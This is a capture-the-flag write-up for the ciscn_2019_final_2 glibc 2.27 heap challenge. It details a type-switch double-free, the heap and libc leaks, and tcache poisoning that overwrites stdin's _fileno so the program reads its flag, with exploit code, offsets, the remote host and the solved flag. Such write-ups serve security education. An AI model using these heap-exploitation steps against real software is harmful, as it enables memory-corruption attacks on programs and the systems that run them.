# ciscn_2019_final_2 — UAF + tcache poison → overwrite `stdin->_fileno`

> **Flag**: `flag{b9f0b87f-1748-4b13-8124-c6a471980e2c}` (rotated per connection on BUUCTF)
>
> A 64-bit glibc 2.27 heap challenge where the win condition is *not* RCE or hook hijack. The binary `dup2`'s the flag file to fd 666 at init time, so anything that can flip `_IO_2_1_stdin_._fileno` to 666 ends with `scanf` reading the flag and `printf` echoing it back. This makes the challenge a clean exercise in I/O FILE struct manipulation via tcache poisoning, with two-typed UAF (`int` / `short`) providing the primitives.

## 0. File overview

| Field | Value |
|---|---|
| File | `ciscn_final_2` |
| Format | ELF 64-bit LSB, x86-64, dynamic, PIE |
| Protections | Full RELRO, Canary, NX, PIE |
| Symbols | Not stripped ✅ |
| Remote | `node5.buuoj.cn:26638` (IP `117.21.200.176`) |
| libc | glibc 2.27-3ubuntu1 (Ubuntu 18.04) — bundled `libc.so.6` matches BUUCTF's `libc-2.27-64bit.so` byte-for-byte |

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

## 1. Program structure

Four menu options:

```
1. input  → choose 1=int / 2=short → malloc small chunk, store number
2. remove → choose 1=int / 2=short → free current int_pt / short_pt
3. show   → choose 1=int / 2=short → print *int_pt (%d) or *short_pt (%hd)
4. bye_bye → scanf("%s", buf); printf("...%s...", buf)
```

Global state in BSS:

```c
int   *int_pt;       // last-allocated int chunk
short *short_pt;     // last-allocated short chunk
int   int_bool;      // 1 = an object exists and can be freed
int   short_bool;
```

`init_proc()` contains the win primitive:

```c
int fd = open("/home/ciscn_final_2/flag", O_RDONLY);
dup2(fd, 666);
close(fd);
```

So fd 666 is the flag file — anything reading from fd 666 reads the flag.

Chunk sizes:
- `input_int` → `malloc(0x28)` → 0x30 tcache bin
- `input_short` → `malloc(0x18)` → 0x20 tcache bin

## 2. Vulnerability — type-switch resurrects `*_bool`

The `remove` function checks the bool of the *current type only*. After freeing an int chunk, `int_bool=0` so we can't free it again **directly**. But the `input` of the **other type** unintentionally re-sets `int_bool=1`, so this works:

```
input_int(0)      // int_bool=1
remove_int()      // free A1, int_bool=0
input_short(0)    // ALSO resurrects int_bool=1 (the type-switch bug)
remove_int()      // double-free A1 ✅
```

Combined with tcache (glibc 2.27 has no double-free check), this is a clean tcache poison primitive on both 0x30 and 0x20 bins.

## 3. Exploitation chain

### Phase 1 — heap leak via int UAF + double-free

After double-freeing A1, `int_pt` still dangles to A1. `show_int` reads `*int_pt`, which is the tcache fd field. Since A1 was the second free, fd points to the previous-freed chunk (itself) → heap address.

```python
input_int(0); remove_int(); input_short(0); remove_int()
input_short(0); input_short(0); input_short(0)
show_int()                               # prints low 32 bits of heap addr
```

Glibc-2.27 heap base is stable in the `0x55XXXXXXXXXX` band, so if leak < `0x100000000` we OR in the prefix.

### Phase 2 — forge fake 0x91 / 0x21 chunks for later

```python
input_int(heap_addr + 0x80)   # A1.fd = heap+0x80 (tcache poison target)
input_int(0)                   # pop A1 from tcache
input_int(0x91)                # next alloc lands at heap+0x80, writes 0x91 as "size"
input_int(0); input_int(0); input_int(0x21)
```

These look-alike chunk headers are needed so the 0x20 bin later sees a clean free path without integrity errors.

### Phase 3 — libc leak via 0x20 unsorted-bin overflow

Fill the 0x20 tcache (7 chunks), then free an 8th — it skips tcache and lands in **unsorted bin**, whose fd → `main_arena+0x60` in libc. `show_short` reads low 16 bits.

```python
for _ in range(7):
    remove_short(); input_int(0)
remove_short()
show_short()                              # %hd, beware signed
```

Note: `*_bool` resurrection trick is used again — `input_int(0)` between frees keeps `short_bool=1`.

### Phase 4 — tcache poison → write `stdin->_fileno = 666`

Glibc 2.27 layout: `_IO_2_1_stdin_._fileno` sits at offset +0x70 (112 bytes) inside the FILE struct. The leaked libc low-16 (let's call it `L`) is `(&main_arena+0x60) & 0xffff`. Stdin's `_fileno` offset relative to L is `-0x2a0 + 112`. Subtract 8 for chunk header.

```python
input_short(L - 0x2a0 + 112 - 8)         # set fake fd pointing at stdin._fileno
input_short(0); input_short(0)           # padding for chunk metadata
input_short(0); input_short(0)
remove_short(); input_int(0)             # re-trigger free into the poisoned chain
remove_short()
input_short((heap_addr & 0xffff) + 0x90) # tcache fd → stdin._fileno on the next alloc
input_short(0); input_short(0)

# The kill shot
menu(1)
p.sendlineafter(b'short int\n>', b'2')
p.sendlineafter(b'number:', b'666')      # *short_pt = 666 → stdin->_fileno = 666
```

### Phase 5 — trigger flag read in `bye_bye`

```python
menu(4)
p.recvuntil(b'last?')
p.send(b'whatever\n')                    # scanf reads from fd 666 (flag file)
print(p.recvall(timeout=3))              # printf echoes the flag
```

Output:

```
your message :flag{b9f0b87f-1748-4b13-8124-c6a471980e2c} we have received...
have fun !
```

## 4. Lessons

- **Look for non-RCE win conditions**: spotting `dup2(fd, 666)` in `init_proc` reframes the whole challenge — no need to hijack hooks if you can manipulate I/O FILE structs.
- **Type-switch bool resurrection**: when two parallel state machines share global flags, transitions can be a primitive.
- **`%d` truncation on heap leaks**: x86-64 PIE heap is high-32-bits stable, so a low-32-bit leak still works with an OR-mask reconstruction.
- **Signed short output**: `%hd` returns negative on values ≥ 0x8000 — always normalize with `+0x10000`.
- **glibc 2.27 has no tcache double-free integrity** (key field was added in 2.29) — double-free in 2.27 is mostly free.
- **BUUCTF DNS instability**: `socket.gaierror` on `node5.buuoj.cn` — resolve once, hardcode IP `117.21.200.176` for stable runs.
- **libc consistency**: BUUCTF's bundled `libc.so.6` is byte-identical to `glibc-all-in-one/libs/BUUCTF_libc/libc-2.27-64bit.so` (same build hash `b417c0ba...`), so local offsets transfer directly to remote.

## 5. Key concepts

- I/O FILE struct manipulation — overwriting `_IO_2_1_stdin_._fileno` to redirect `scanf` reads
- tcache poisoning on glibc 2.27 (no double-free key check)
- Unsorted bin libc leak via filling 7-slot tcache
- BUU bundled-libc workflow
